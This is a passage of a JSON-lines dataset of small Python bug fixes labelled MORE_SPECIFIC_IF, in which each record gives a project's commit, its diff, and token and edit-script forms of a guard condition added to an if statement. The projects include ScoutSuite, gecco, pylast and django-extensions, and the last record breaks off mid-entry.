{"project": "ScoutSuite", "commit_sha": "0519560542e4e96c7d638e174f1dfaf263ae83ad", "parent_sha": "3a58314a3428e2ca1dd2c87f7156650d83d9c455", "file_path": "AWSScout2/utils.py", "project_url": "https://github.com/agnivesh/ScoutSuite", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -609,7 +609,7 @@ def load_config_from_json(rule_metadata, ip_ranges, aws_account_id):\n                         c1[2] = []\n                         for ip_range in ip_ranges:\n                             c1[2] = c1[2] + read_ip_ranges(ip_range, True, conditions, True)\n-                if c1[2]:\n+                if c1[2] and aws_account_id:\n                     c1[2] = c1[2].replace('_AWS_ACCOUNT_ID_', aws_account_id)\n                 # Set lists\n                 list_value = re_list_value.match(str(c1[2]))\n", "before": "if c1 [ 2 ] : c1 [ 2 ] = c1 [ 2 ] . replace ( '_AWS_ACCOUNT_ID_' , aws_account_id )", "after": "if c1 [ 2 ] and aws_account_id : c1 [ 2 ] = c1 [ 2 ] . replace ( '_AWS_ACCOUNT_ID_' , aws_account_id )", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 17, 4, 78], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"subscript\", 3, 20, 3, 25], 0], [\"Insert\", \"N0\", [\"and:and\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:aws_account_id\", \"T\"], 2]]"}
{"project": "ScoutSuite", "commit_sha": "1c98dd2591c5527241b7faf740ce7a03b0151846", "parent_sha": "522c15740c71109e77d36829ebe6a65748e19359", "file_path": "AWSScout2/rules/preprocessing.py", "project_url": "https://github.com/agnivesh/ScoutSuite", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -69,7 +69,7 @@ def list_ec2_network_attack_surface(ec2_config):\n \n \n def list_ec2_network_attack_surface_callback(ec2_config, current_config, path, current_path, privateip_id, callback_args):\n-    if 'Association' in current_config:\n+    if 'Association' in current_config and current_config['Association']:\n         public_ip = current_config['Association']['PublicIp']\n         manage_dictionary(ec2_config, 'attack_surface', {})\n         manage_dictionary(ec2_config['attack_surface'], public_ip, {})\n", "before": "if 'Association' in current_config : public_ip = current_config [ 'Association' ] [ 'PublicIp' ] manage_dictionary ( ec2_config , 'attack_surface' , { } ) manage_dictionary ( ec2_config [ 'attack_surface' ] , public_ip , { } )", "after": "if 'Association' in current_config and current_config [ 'Association' ] : public_ip = current_config [ 'Association' ] [ 'PublicIp' ] manage_dictionary ( ec2_config , 'attack_surface' , { } ) manage_dictionary ( ec2_config [ 'attack_surface' ] , public_ip , { } )", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 5, 6, 71], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"comparison_operator\", 3, 8, 3, 39], 0], [\"Insert\", \"N0\", [\"and:and\", \"T\"], 1], [\"Insert\", \"N0\", [\"subscript\", \"N1\"], 2], [\"Insert\", \"N1\", [\"identifier:current_config\", \"T\"], 0], [\"Insert\", \"N1\", [\"[:[\", \"T\"], 1], [\"Insert\", \"N1\", [\"string:'Association'\", \"T\"], 2], [\"Insert\", \"N1\", [\"]:]\", \"T\"], 3]]"}
{"project": "ScoutSuite", "commit_sha": "f29fb26e9c997ede55379a685179b90af3b3d547", "parent_sha": "babe96177aa21828074d98be5ac4f808e6cc90d1", "file_path": "AWSScout2/rules/postprocessing.py", "project_url": "https://github.com/agnivesh/ScoutSuite", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -38,7 +38,7 @@ def update_last_run(aws_config, current_time, ruleset):\n                 last_run['summary'][service]['rules_count'] += 1\n                 last_run['summary'][service]['checked_items'] += aws_config['services'][service]['findings'][finding]['checked_items']\n                 last_run['summary'][service]['flagged_items'] += aws_config['services'][service]['findings'][finding]['flagged_items']\n-                if last_run['summary'][service]['max_level'] != 'danger':\n+                if last_run['summary'][service]['max_level'] != 'danger' and len(aws_config['services'][service]['findings'][finding]['items']) > 0:\n                     last_run['summary'][service]['max_level'] = aws_config['services'][service]['findings'][finding]['level']\n         # Total number of resources\n         for key in aws_config['services'][service]:\n", "before": "if last_run [ 'summary' ] [ service ] [ 'max_level' ] != 'danger' : last_run [ 'summary' ] [ service ] [ 'max_level' ] = aws_config [ 'services' ] [ service ] [ 'findings' ] [ finding ] [ 'level' ]", "after": "if last_run [ 'summary' ] [ service ] [ 'max_level' ] != 'danger' and len ( aws_config [ 'services' ] [ service ] [ 'findings' ] [ finding ] [ 'items' ] ) > 0 : last_run [ 'summary' ] [ service ] [ 'max_level' ] = aws_config [ 'services' ] [ service ] [ 'findings' ] [ finding ] [ 'level' ]", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 17, 4, 126], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"comparison_operator\", 3, 20, 3, 73], 0], [\"Insert\", \"N0\", [\"and:and\", \"T\"], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 2], [\"Insert\", \"N1\", [\"call\", \"N2\"], 0], [\"Insert\", \"N1\", [\">:>\", \"T\"], 1], [\"Insert\", \"N1\", [\"integer:0\", \"T\"], 2], [\"Insert\", \"N2\", [\"identifier:len\", \"T\"], 0], [\"Insert\", \"N2\", [\"argument_list\", \"N3\"], 1], [\"Insert\", \"N3\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N3\", [\"subscript\", \"N4\"], 1], [\"Insert\", \"N3\", [\"):)\", \"T\"], 2], [\"Insert\", \"N4\", [\"subscript\", \"N5\"], 0], [\"Insert\", \"N4\", [\"[:[\", \"T\"], 1], [\"Insert\", \"N4\", [\"string:'items'\", \"T\"], 2], [\"Insert\", \"N4\", [\"]:]\", \"T\"], 3], [\"Insert\", \"N5\", [\"subscript\", \"N6\"], 0], [\"Insert\", \"N5\", [\"[:[\", \"T\"], 1], [\"Insert\", \"N5\", [\"identifier:finding\", \"T\"], 2], [\"Insert\", \"N5\", [\"]:]\", \"T\"], 3], [\"Insert\", \"N6\", [\"subscript\", \"N7\"], 0], [\"Insert\", \"N6\", [\"[:[\", \"T\"], 1], [\"Insert\", \"N6\", [\"string:'findings'\", \"T\"], 2], [\"Insert\", \"N6\", [\"]:]\", \"T\"], 3], [\"Insert\", \"N7\", [\"subscript\", \"N8\"], 0], [\"Insert\", \"N7\", [\"[:[\", \"T\"], 1], [\"Insert\", \"N7\", [\"identifier:service\", \"T\"], 2], [\"Insert\", \"N7\", [\"]:]\", \"T\"], 3], [\"Insert\", \"N8\", [\"identifier:aws_config\", \"T\"], 0], [\"Insert\", \"N8\", [\"[:[\", \"T\"], 1], [\"Insert\", \"N8\", [\"string:'services'\", \"T\"], 2], [\"Insert\", \"N8\", [\"]:]\", \"T\"], 3]]"}
{"project": "fisbadge", "commit_sha": "bfb8cab1543b844008114dbd97e8c7e018ff328d", "parent_sha": "fe1858d0c44853051c7a4f30923b204da5484c89", "file_path": "data.py", "project_url": "https://github.com/legion151/fisbadge", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -11,7 +11,7 @@ class Members():\n \n     def proofMember(self,userkey):\n         for member in self.members:\n-            if member.memberkey == userkey:\n+            if len(userkey)>0 and member.memberkey == userkey:\n                 memberCpy = copy.copy(member)\n                 member.updateLastSeen()\n                 self.persist()\n", "before": "if member . memberkey == userkey : memberCpy = copy . copy ( member ) member . updateLastSeen ( ) self . persist ( )", "after": "if len ( userkey ) > 0 and member . memberkey == userkey : memberCpy = copy . copy ( member ) member . updateLastSeen ( ) self . persist ( )", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 13, 6, 31], [\"boolean_operator\", \"N0\"], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 0], [\"Insert\", \"N0\", [\"and:and\", \"T\"], 1], [\"Move\", \"N0\", [\"comparison_operator\", 3, 16, 3, 43], 2], [\"Insert\", \"N1\", [\"call\", \"N2\"], 0], [\"Insert\", \"N1\", [\">:>\", \"T\"], 1], [\"Insert\", \"N1\", [\"integer:0\", \"T\"], 2], [\"Insert\", \"N2\", [\"identifier:len\", \"T\"], 0], [\"Insert\", \"N2\", [\"argument_list\", \"N3\"], 1], [\"Insert\", \"N3\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N3\", [\"identifier:userkey\", \"T\"], 1], [\"Insert\", \"N3\", [\"):)\", \"T\"], 2]]"}
{"project": "folia", "commit_sha": "3545848840117aa98e342c12680d4d89cd65ac5d", "parent_sha": "f54a29071bbf9a5105ce7cd3e3b7bdecd73cce80", "file_path": "foliatools/foliatree.py", "project_url": "https://github.com/MeTavi/folia", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -54,7 +54,7 @@ def processelement(element, depth=0):\n     if not isinstance(element, folia.AbstractElement): return False\n     if settings.structureonly and not isinstance(element, folia.AbstractStructureElement): return False\n     try:\n-        if not settings.types or element.XMLTAG in settings.types:\n+        if (not settings.types or element.XMLTAG in settings.types) and element.XMLTAG:\n             out = \"    \" * depth\n             out += element.XMLTAG\n             if settings.ids and element.id:\n", "before": "if not settings . types or element . XMLTAG in settings . types : out = \"    \" * depth out += element . XMLTAG if settings . ids and element . id : ", "after": "if ( not settings . types or element . XMLTAG in settings . types ) and element . XMLTAG : out = \"    \" * depth out += element . XMLTAG if settings . ids and element . id : ", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 9, 6, 44], [\"boolean_operator\", \"N0\"], 1], [\"Insert\", \"N0\", [\"parenthesized_expression\", \"N1\"], 0], [\"Insert\", \"N0\", [\"and:and\", \"T\"], 1], [\"Insert\", \"N0\", [\"attribute\", \"N2\"], 2], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Move\", \"N1\", [\"not_operator\", 3, 12, 3, 66], 1], [\"Insert\", \"N1\", [\"):)\", \"T\"], 2], [\"Insert\", \"N2\", [\"identifier:element\", \"T\"], 0], [\"Insert\", \"N2\", [\".:.\", \"T\"], 1], [\"Insert\", \"N2\", [\"identifier:XMLTAG\", \"T\"], 2]]"}
{"project": "gecco", "commit_sha": "50a12f9bdd97a5eb5f4ab16bccb6365b0a9d80bb", "parent_sha": "7d1f47f60afead8ea598dc17f03ffaa6bb8f8dbf", "file_path": "gecco/modules/puncrecase.py", "project_url": "https://github.com/MeTavi/gecco", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -233,7 +233,7 @@ class TIMBLPuncRecaseModule(Module):\n \n         recase = False\n \n-        if cls[-1] == 'C':\n+        if cls[-1] == 'C' and wordstr[0] == wordstr[0].lower():\n             cls = cls[:-1]\n             recase = True\n \n", "before": "if cls [ - 1 ] == 'C' : cls = cls [ : - 1 ] recase = True", "after": "if cls [ - 1 ] == 'C' and wordstr [ 0 ] == wordstr [ 0 ] . lower ( ) : cls = cls [ : - 1 ] recase = True", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 9, 5, 26], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"comparison_operator\", 3, 12, 3, 26], 0], [\"Insert\", \"N0\", [\"and:and\", \"T\"], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 2], [\"Insert\", \"N1\", [\"subscript\", \"N2\"], 0], [\"Insert\", \"N1\", [\"==:==\", \"T\"], 1], [\"Insert\", \"N1\", [\"call\", \"N3\"], 2], [\"Insert\", \"N2\", [\"identifier:wordstr\", \"T\"], 0], [\"Insert\", \"N2\", [\"[:[\", \"T\"], 1], [\"Insert\", \"N2\", [\"integer:0\", \"T\"], 2], [\"Insert\", \"N2\", [\"]:]\", \"T\"], 3], [\"Insert\", \"N3\", [\"attribute\", \"N4\"], 0], [\"Insert\", \"N3\", [\"argument_list\", \"N5\"], 1], [\"Insert\", \"N4\", [\"subscript\", \"N6\"], 0], [\"Insert\", \"N4\", [\".:.\", \"T\"], 1], [\"Insert\", \"N4\", [\"identifier:lower\", \"T\"], 2], [\"Insert\", \"N5\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N5\", [\"):)\", \"T\"], 1], [\"Insert\", \"N6\", [\"identifier:wordstr\", \"T\"], 0], [\"Insert\", \"N6\", [\"[:[\", \"T\"], 1], [\"Insert\", \"N6\", [\"integer:0\", \"T\"], 2], [\"Insert\", \"N6\", [\"]:]\", \"T\"], 3]]"}
{"project": "gecco", "commit_sha": "f1a48041ff3cff05b10278308a3b84881109f342", "parent_sha": "4a6009b48f60691f252d8bfd8acbada9bbe4e5d6", "file_path": "gecco/modules/puncrecase.py", "project_url": "https://github.com/MeTavi/gecco", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -226,7 +226,7 @@ class ColibriPuncRecaseModule(Module):\n                                         if self.debug: self.log(\" (Punctuation deletion candidate: \" + \" \".join(bigram) +  \" (\" + str(bigram_oc) + \") vs \" + \" \".join(trigram) + \" (\"+str(trigram_oc)+\")\")\n                                         actions[i-1] = ('delete',trigram[1],bigram_oc)\n \n-            if actions[i-1] is None:\n+            if i > 0 and actions[i-1] is None:\n                 #Recasing\n                 #given a trigram x y z\n                 #check if x Y is more frequent than x y and if Y z is more frequent than y z\n", "before": "if actions [ i - 1 ] is None : ", "after": "if i > 0 and actions [ i - 1 ] is None : ", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 13, 3, 37], [\"boolean_operator\", \"N0\"], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 0], [\"Insert\", \"N0\", [\"and:and\", \"T\"], 1], [\"Move\", \"N0\", [\"comparison_operator\", 3, 16, 3, 36], 2], [\"Insert\", \"N1\", [\"identifier:i\", \"T\"], 0], [\"Insert\", \"N1\", [\">:>\", \"T\"], 1], [\"Insert\", \"N1\", [\"integer:0\", \"T\"], 2]]"}
{"project": "gecco", "commit_sha": "2059d9a13830858a1f75dfc5d4b3111f42f08bc0", "parent_sha": "f1a48041ff3cff05b10278308a3b84881109f342", "file_path": "gecco/modules/puncrecase.py", "project_url": "https://github.com/MeTavi/gecco", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -226,7 +226,7 @@ class ColibriPuncRecaseModule(Module):\n                                         if self.debug: self.log(\" (Punctuation deletion candidate: \" + \" \".join(bigram) +  \" (\" + str(bigram_oc) + \") vs \" + \" \".join(trigram) + \" (\"+str(trigram_oc)+\")\")\n                                         actions[i-1] = ('delete',trigram[1],bigram_oc)\n \n-            if i > 0 and actions[i-1] is None:\n+            if i > 0 and len(actions) > i-1 and actions[i-1] is None:\n                 #Recasing\n                 #given a trigram x y z\n                 #check if x Y is more frequent than x y and if Y z is more frequent than y z\n", "before": "if i > 0 and actions [ i - 1 ] is None : ", "after": "if i > 0 and len ( actions ) > i - 1 and actions [ i - 1 ] is None : ", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"boolean_operator\", 3, 16, 3, 46], [\"boolean_operator\", \"N0\"], 0], [\"Insert\", [\"boolean_operator\", 3, 16, 3, 46], [\"and:and\", \"T\"], 1], [\"Move\", \"N0\", [\"comparison_operator\", 3, 16, 3, 21], 0], [\"Move\", \"N0\", [\"and:and\", 3, 22, 3, 25], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 2], [\"Insert\", \"N1\", [\"call\", \"N2\"], 0], [\"Insert\", \"N1\", [\">:>\", \"T\"], 1], [\"Insert\", \"N1\", [\"binary_operator\", \"N3\"], 2], [\"Insert\", \"N2\", [\"identifier:len\", \"T\"], 0], [\"Insert\", \"N2\", [\"argument_list\", \"N4\"], 1], [\"Insert\", \"N3\", [\"identifier:i\", \"T\"], 0], [\"Insert\", \"N3\", [\"-:-\", \"T\"], 1], [\"Insert\", \"N3\", [\"integer:1\", \"T\"], 2], [\"Insert\", \"N4\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N4\", [\"identifier:actions\", \"T\"], 1], [\"Insert\", \"N4\", [\"):)\", \"T\"], 2]]"}
{"project": "soundcloud-python", "commit_sha": "0e24f1b57af4a7dbe96c98f84d0d3c1739fe88bb", "parent_sha": "47ccee8ba0ec1488db0c41835561583f35071d97", "file_path": "soundcloud/client.py", "project_url": "https://github.com/mobolic/soundcloud-python", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -138,7 +138,7 @@ class Client(object):\n     def _resolve_resource_name(self, name):\n         \"\"\"Convert a resource name (e.g. tracks) into a URI.\"\"\"\n         if name[:4] == 'http':  # already a url\n-            if name[:4] != 'json':\n+            if name[:4] != 'json' and name[-8:] not in ['download', 'stream']:\n                 return '%s.json' % (name,)\n             return name\n         name = name.rstrip('/').lstrip('/')\n", "before": "if name [ : 4 ] != 'json' : return '%s.json' % ( name , )", "after": "if name [ : 4 ] != 'json' and name [ - 8 : ] not in [ 'download' , 'stream' ] : return '%s.json' % ( name , )", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 13, 4, 43], [\"boolean_operator\", \"N0\"], 1], [\"Insert\", [\"if_statement\", 3, 13, 4, 43], [\":::\", \"T\"], 2], [\"Move\", \"N0\", [\"comparison_operator\", 3, 16, 3, 34], 0], [\"Insert\", \"N0\", [\"and:and\", \"T\"], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 2], [\"Insert\", \"N1\", [\"subscript\", \"N2\"], 0], [\"Insert\", \"N1\", [\"not:not\", \"T\"], 1], [\"Insert\", \"N1\", [\"in:in\", \"T\"], 2], [\"Insert\", \"N1\", [\"list\", \"N3\"], 3], [\"Insert\", \"N2\", [\"identifier:name\", \"T\"], 0], [\"Insert\", \"N2\", [\"[:[\", \"T\"], 1], [\"Insert\", \"N2\", [\"slice\", \"N4\"], 2], [\"Insert\", \"N2\", [\"]:]\", \"T\"], 3], [\"Insert\", \"N3\", [\"[:[\", \"T\"], 0], [\"Insert\", \"N3\", [\"string:'download'\", \"T\"], 1], [\"Insert\", \"N3\", [\",:,\", \"T\"], 2], [\"Insert\", \"N3\", [\"string:'stream'\", \"T\"], 3], [\"Insert\", \"N3\", [\"]:]\", \"T\"], 4], [\"Insert\", \"N4\", [\"unary_operator\", \"N5\"], 0], [\"Move\", \"N4\", [\":::\", 3, 34, 3, 35], 1], [\"Insert\", \"N5\", [\"-:-\", \"T\"], 0], [\"Insert\", \"N5\", [\"integer:8\", \"T\"], 1]]"}
{"project": "pylast", "commit_sha": "5423322cd7178b6d1b408caf49bbc018a2491133", "parent_sha": "6b3185bf7b569b5f31c1bde818cd095c57b1f1d9", "file_path": "pylast.py", "project_url": "https://github.com/sergithon/pylast", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -502,7 +502,7 @@ class _Network(object):\n             \n             for arg in additional_args:\n                 \n-                if tracks_to_scrobble[i][arg]:\n+                if arg in tracks_to_scrobble[i] and tracks_to_scrobble[i][arg]:\n                     if arg in args_map_to:\n                         maps_to = args_map_to[arg]\n                     else:\n", "before": "if tracks_to_scrobble [ i ] [ arg ] : if arg in args_map_to : maps_to = args_map_to [ arg ] else : ", "after": "if arg in tracks_to_scrobble [ i ] and tracks_to_scrobble [ i ] [ arg ] : if arg in args_map_to : maps_to = args_map_to [ arg ] else : ", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 17, 6, 26], [\"boolean_operator\", \"N0\"], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 0], [\"Insert\", \"N0\", [\"and:and\", \"T\"], 1], [\"Move\", \"N0\", [\"subscript\", 3, 20, 3, 46], 2], [\"Insert\", \"N1\", [\"identifier:arg\", \"T\"], 0], [\"Insert\", \"N1\", [\"in:in\", \"T\"], 1], [\"Insert\", \"N1\", [\"subscript\", \"N2\"], 2], [\"Insert\", \"N2\", [\"identifier:tracks_to_scrobble\", \"T\"], 0], [\"Insert\", \"N2\", [\"[:[\", \"T\"], 1], [\"Insert\", \"N2\", [\"identifier:i\", \"T\"], 2], [\"Insert\", \"N2\", [\"]:]\", \"T\"], 3]]"}
{"project": "vumi-go", "commit_sha": "d8fbd9d751b4fe7c3667ba561d86ba086a606dcc", "parent_sha": "61a6cfe5ac080bc69b86d08d63f723cf204db7b2", "file_path": "go/conversation/views.py", "project_url": "https://github.com/ChrisNolan1992/vumi-go", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -51,7 +51,7 @@ def upload(request, conversation_pk):\n         upload_contacts_form = UploadContactsForm(request.POST,\n             request.FILES)\n         delivery_class = SelectDeliveryClassForm(request.POST)\n-        if upload_contacts_form.is_valid():\n+        if upload_contacts_form.is_valid() and delivery_class.is_valid():\n             contacts = Contact.create_from_csv_file(request.user,\n                 request.FILES['file'], settings.VUMI_COUNTRY_CODE)\n             if request.POST.get('name'):\n", "before": "if upload_contacts_form . is_valid ( ) : contacts = Contact . create_from_csv_file ( request . user , request . FILES [ 'file' ] , settings . VUMI_COUNTRY_CODE ) if request . POST . get ( 'name' ) : ", "after": "if upload_contacts_form . is_valid ( ) and delivery_class . is_valid ( ) : contacts = Contact . create_from_csv_file ( request . user , request . FILES [ 'file' ] , settings . VUMI_COUNTRY_CODE ) if request . POST . get ( 'name' ) : ", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 9, 6, 41], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"call\", 3, 12, 3, 43], 0], [\"Insert\", \"N0\", [\"and:and\", \"T\"], 1], [\"Insert\", \"N0\", [\"call\", \"N1\"], 2], [\"Insert\", \"N1\", [\"attribute\", \"N2\"], 0], [\"Insert\", \"N1\", [\"argument_list\", \"N3\"], 1], [\"Insert\", \"N2\", [\"identifier:delivery_class\", \"T\"], 0], [\"Insert\", \"N2\", [\".:.\", \"T\"], 1], [\"Insert\", \"N2\", [\"identifier:is_valid\", \"T\"], 2], [\"Insert\", \"N3\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N3\", [\"):)\", \"T\"], 1]]"}
{"project": "grab", "commit_sha": "216d70f27b9d77b52bdb422fbb51e593b1c9d32a", "parent_sha": "9af6ae2814da547ca73f9e9df1c028d562d1d1b3", "file_path": "grab/export/csv_dumper.py", "project_url": "https://github.com/sergithon/grab", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -7,7 +7,7 @@ class CSVDumper(object):\n         self.write_header = write_header\n         self.file_handler = open(path, 'w')\n         self.writer = csv.writer(self.file_handler, quoting=quoting)\n-        if self.write_header:\n+        if self.fields and self.write_header:\n             self.writer.writerow(self.normalize_row(self.fields))\n \n     def add_record(self, rec, ignore_fields={}):\n", "before": "if self . write_header : self . writer . writerow ( self . normalize_row ( self . fields ) )", "after": "if self . fields and self . write_header : self . writer . writerow ( self . normalize_row ( self . fields ) )", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 9, 4, 66], [\"boolean_operator\", \"N0\"], 1], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\"and:and\", \"T\"], 1], [\"Move\", \"N0\", [\"attribute\", 3, 12, 3, 29], 2], [\"Insert\", \"N1\", [\"identifier:self\", \"T\"], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:fields\", \"T\"], 2]]"}
{"project": "geonode", "commit_sha": "4a418dbfbf6d43a7ae9a8656b5ad3ec9fdb55e59", "parent_sha": "0aeb5dfd1aa7d4c9c54844df7e074f20b689c3c4", "file_path": "src/GeoNodePy/geonode/maps/views.py", "project_url": "https://github.com/vidyar/geonode", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -1046,7 +1046,7 @@ def _perms_info_json(obj, level_names):\n     info[AUTHENTICATED_USERS] = info.get(AUTHENTICATED_USERS, obj.LEVEL_NONE)\n     info['users'] = sorted(info['users'].items())\n     info['levels'] = [(i, level_names[i]) for i in obj.permission_levels]\n-    if hasattr(obj, 'owner'): info['owner'] = obj.owner.username\n+    if hasattr(obj, 'owner') and obj.owner: info['owner'] = obj.owner.username\n     return json.dumps(info)\n \n INVALID_PERMISSION_MESSAGE = _(\"Invalid permission level.\")\n", "before": "if hasattr ( obj , 'owner' ) : info [ 'owner' ] = obj . owner . username", "after": "if hasattr ( obj , 'owner' ) and obj . owner : info [ 'owner' ] = obj . owner . username", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 5, 3, 65], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"call\", 3, 8, 3, 29], 0], [\"Insert\", \"N0\", [\"and:and\", \"T\"], 1], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 2], [\"Insert\", \"N1\", [\"identifier:obj\", \"T\"], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:owner\", \"T\"], 2]]"}
{"project": "django-extensions", "commit_sha": "43294949d2ce496e3a5438ac1d6544b6ccf492cd", "parent_sha": "1b3cb8a65204185fce9ec932d85584bc0420ed8f", "file_path": "django_extensions/management/modelviz.py", "project_url": "https://github.com/quinode/django-extensions", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -227,7 +227,7 @@ def generate_dot(app_labels, **kwargs):\n \n             if appmodel._meta.many_to_many:\n                 for field in appmodel._meta.many_to_many:\n-                    if isinstance(field, ManyToManyField):\n+                    if isinstance(field, ManyToManyField) and getattr(field, 'creates_table', False):\n                         add_relation(field, '[arrowhead=normal arrowtail=normal]')\n                     elif isinstance(field, GenericRelation):\n                         add_relation(field, mark_safe('[style=\"dotted\"] [arrowhead=normal arrowtail=normal]'))\n", "before": "if isinstance ( field , ManyToManyField ) : add_relation ( field , '[arrowhead=normal arrowtail=normal]' ) elif isinstance ( field , GenericRelation ) : add_relation ( field , mark_safe ( '[style=\"dotted\"] [arrowhead=normal arrowtail=normal]' ) )", "after": "if isinstance ( field , ManyToManyField ) and getattr ( field , 'creates_table' , False ) : add_relation ( field , '[arrowhead=normal arrowtail=normal]' ) elif isinstance ( field , GenericRelation ) : add_relation ( field , mark_safe ( '[style=\"dotted\"] [arrowhead=normal arrowtail=normal]' ) )", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 21, 6, 111], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"call\", 3, 24, 3, 58], 0], [\"Insert\", \"N0\", [\"and:and\", \"T\"], 1], [\"Insert\", \"N0\", [\"call\", \"N1\"], 2], [\"Insert\", \"N1\", [\"identifier:getattr\", \"T\"], 0], [\"Insert\", \"N1\", [\"argument_list\", \"N2\"], 1], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N2\", [\"identifier:field\", \"T\"], 1], [\"Insert\", \"N2\", [\",:,\", \"T\"], 2], [\"Insert\", \"N2\", [\"string:'creates_table'\", \"T\"], 3], [\"Insert\", \"N2\", [\",:,\", \"T\"], 4], [\"Insert\", \"N2\", [\"false:False\", \"T\"], 5], [\"Insert\", \"N2\", [\"):)\", \"T\"], 6]]"}
{"project": "django-extensions", "commit_sha": "85b26b3115582a8cc6198a0c7651e49d4a9b3549", "parent_sha": "fb1051f82a76aece8185eff7bad21b186bad72db", "file_path": "django_extensions/management/commands/sqldiff.py", "project_url": "https://github.com/quinode/django-extensions", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -440,7 +440,7 @@ class SqliteSQLDiff(SQLDiff):\n                 attname = field.db_column or field.attname\n                 if attname in table_indexes and table_indexes[attname]['unique']:\n                     continue\n-                if table_indexes[attname]['primary_key']:\n+                if attname in table_indexes and table_indexes[attname]['primary_key']:\n                     continue\n                 self.add_difference('unique-missing-in-db', table_name, attname)\n \n", "before": "if table_indexes [ attname ] [ 'primary_key' ] : continue", "after": "if attname in table_indexes and table_indexes [ attname ] [ 'primary_key' ] : continue", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 17, 4, 29], [\"boolean_operator\", \"N0\"], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 0], [\"Insert\", \"N0\", [\"and:and\", \"T\"], 1], [\"Move\", \"N0\", [\"subscript\", 3, 20, 3, 57], 2], [\"Insert\", \"N1\", [\"identifier:attname\", \"T\"], 0], [\"Insert\", \"N1\", [\"in:in\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:table_indexes\", \"T\"], 2]]"}
{"project": "Theano", "commit_sha": "72997cde30a00b5e5ec367e9071918c01773f740", "parent_sha": "507c5a3ee9e798a31e3c60041aaf4c17ebe27979", "file_path": "theano/sandbox/cuda/__init__.py", "project_url": "https://github.com/reference-project/Theano", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -288,7 +288,7 @@ def handle_shared_float32(tf):\n         raise NotImplementedError('removing our handler')\n \n def reduce_tensor_variable(var):\n-    if isinstance(var.owner.op, HostFromGpu) and len(var.owner.inputs) == 1 \\\n+    if var.owner and isinstance(var.owner.op, HostFromGpu) and len(var.owner.inputs) == 1 \\\n             and isinstance(var.owner.inputs[0], CudaNdarraySharedVariable):\n         return load_shared_variable, (var.owner.inputs[0].get_value(),)\n     else:\n", "before": "if isinstance ( var . owner . op , HostFromGpu ) and len ( var . owner . inputs ) == 1 and isinstance ( var . owner . inputs [ 0 ] , CudaNdarraySharedVariable ) : return load_shared_variable , ( var . owner . inputs [ 0 ] . get_value ( ) , ) else : ", "after": "if var . owner and isinstance ( var . owner 